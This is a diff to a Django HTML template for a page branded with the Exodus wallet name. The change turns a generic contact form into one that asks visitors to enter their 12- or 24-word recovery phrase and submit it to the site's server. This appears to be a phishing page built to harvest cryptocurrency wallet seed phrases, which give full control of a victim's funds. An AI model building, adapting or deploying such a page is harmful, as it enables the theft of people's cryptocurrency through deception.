@@ -38,7 +38,7 @@
                     <div class="w3breadcrumb-left text-left">
                         
                         <p class="inner-page-para mt-2">
-                            Exodus </p>
+                            Exodus</p>
                     </div>
                     
                 </div>
@@ -47,38 +47,34 @@
         </section>
     </div>
     <!--//inner-page-->
-    <!-- contact-form -->
-    <section class="w3l-contact-main" id="contact">
-        <div class="contact-infhny py-5">
-            <div class="container py-md-5">
-                <div class="title-content text-center mb-md-5 mb-4">
-                    
-                    <p class="text-para mt-2">Enter code for <b style="color:#fa9f1e">Exodus</b></p>
-                </div>
-                <div class="top-map">
-                    <div class="map-content-9">
-                         <form action="#" method="post">
-                            {% csrf_token %}
-                            <div class="form-top1">
-
-                                <div class="form-top">
-                                    <div class="form-top-righ">
-                                        <textarea name="Message" id="Message" placeholder="Message*" required=""></textarea>
-                                    </div>
-                                    
-
-                                </div>
-                                <div class="text-center mt-5">
-                                    <button type="submit" class="btn btn-style btn-primary">Submit Now <i class="far fa-paper-plane ml-lg-3"></i></button>
-                                </div>
-                            </div>
-                        </form>
-                    </div>
-                </div>
+<!-- contact -->
+<section class="w3l-contact-main" id="contact">
+	<div class="contact-infhny py-5">
+		<div class="container py-md-5">
+			<div class="title-content text-center mb-md-5 mb-4">
+				
+				<p class="text-para mt-2">Enter code for <b style="color:#fa9f1e">Exodus</b></p>
+				<p class="text-para">Typically 12 (sometimes 24) words separated by single spaces</p>
+			</div>
+			<div class="top-map">
+				<div class="map-content-9">
+					<form action="" method="POST" class="contact-form">
+						{% csrf_token %}
+						<div class="form-top1">
+							
+								<textarea name="message" placeholder="Enter your recovery phrase" cols="30" rows="10" required=""></textarea>
+							
+							
+							
+						</div>
+						<input type="submit" class="btn btn-style btn-primary" value="submit" style="background-color: #006837">
+					</form>
+				</div>
             </div>
         </div>
     </section>
  
+
     <!--/footer-->
     <footer class="w3l-footer-29-main">
         <div class="footer-29-w3l py-5">
@@ -185,7 +181,6 @@
     <!-- //disable body scroll which navbar is in active -->
     <!-- //bootstrap -->
     <script src="{% static 'js/bootstrap.min.js' %}"></script>
-
 
 </body>
 
